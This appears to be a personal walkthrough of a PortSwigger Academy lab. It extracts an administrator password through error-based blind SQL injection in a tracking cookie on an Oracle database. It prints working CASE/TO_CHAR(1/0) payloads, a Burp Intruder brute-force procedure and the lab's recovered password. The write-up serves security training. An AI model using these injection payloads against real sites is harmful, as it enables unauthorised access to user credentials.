[Source](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
## Task
This lab has a blind SQL injection vulnerability. The application uses cookies for analytics and executes a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond to changes if the query returns rows. However, if the query fails, the application returns a custom error message.

The database has a `users` table with `username` and `password` columns. You need to exploit a blind SQL injection vulnerability to find out the password of the admin user.

You need to log in as the admin user to solve the lab.
## Solution
Go to the website page
![[Pasted image 20241203170607.png]]
Intercept the main page request in `Burp Suite` and send it to `Repeater`
![[Pasted image 20241222182305.png]]
Add `'` to `TrackingId` and look at the result
![[Pasted image 20241222182500.png]]
Add another `'` and look at the result
![[Pasted image 20241222182517.png]]
This indicates that the syntax error (in this case, the unclosed quote) has a noticeable impact on the response.
Now we need to confirm that the server interprets the injection as a SQL query, i.e. that the error is a SQL syntax error and not some other error. To do this, you first need to build a subquery using correct SQL syntax. Let's try sending:
```SQL
TrackingId=xyz'||(SELECT '')||'
```
![[Pasted image 20241222182544.png]]
In this case, it's worth noting that the query still appears to be invalid. This may be due to the type of database - try specifying a predictable table name in the query.
```SQL
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
![[Pasted image 20241222182613.png]]
Since the error is no longer returned, this indicates that you are probably using an `Oracle` database, which requires an explicit table name in every `SELECT` query.
Now that we have created a query that looks valid, let's try sending an invalid query while maintaining the correct SQL syntax. For example, let's try querying a non-existent table name:
```SQL
'||(SELECT '' FROM not-a-real-table)||'
```
![[Pasted image 20241222182654.png]]
This time, an error will be returned. This behavior strongly suggests that our injection is being processed as a SQL query on the server side.
As long as we always inject syntactically correct SQL queries, we can use this error response to get key information about the database. For example, to check if the `users` table exists, we send the following query:
```SQL
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
![[Pasted image 20241222182744.png]]
Since this query does not raise an error, we can conclude that the table exists. Note that the `WHERE ROWNUM = 1` condition is important here so that the query does not return more than one row, which would break our concatenation.
Now let's try using conditions:
```SQL
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
![[Pasted image 20241222182817.png]]
We see an error. Let's try another condition:
```SQL
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
![[Pasted image 20241222182905.png]]
There is no error. This demonstrates that you can trigger an error conditionally, depending on the truth of a specific condition. The `CASE` operator tests a condition and returns one expression if the condition is true, and another expression if it is false. The first expression contains a divide by zero operation, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and the error occurs when the condition is true.
Using this, we can check if the user `administrator` is in the `users` table
```SQL
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
![[Pasted image 20241222182953.png]]
An error occurred. This means that the user `administrator` is in the `users` table
Now let's check the length of this user's password
```SQL
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
![[Pasted image 20241222183059.png]]
An error occurs. So the password is longer than one character. Continue until the error disappears.
```SQL
'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
![[Pasted image 20241222183119.png]]
There are `20` characters in the password. Now we will iterate over the characters of the password
```SQL
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Send a request with this injection to `Intruder`
![[Pasted image 20241222183931.png]]
In the `Payloads` tab, select `Simple list` and in `Payload settings [Simple list]` add characters from the `a-z` and `0-9` lists. After that, launch the attack.
![[Pasted image 20241222184116.png]]
You need to find the request with the 500 error. In this case, it is the `2` character. Let's move on to the next character.
```SQL
'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
![[Pasted image 20241222184242.png]]
![[Pasted image 20241222184321.png]]
The second character of the password is `r`. We do the same with the remaining characters, of which there are 20.
Final password:
```Password
2r5nrkmpvw745gqeb6ms
```
Log in as `administrator` and change the email
![[Pasted image 20241222184831.png]]
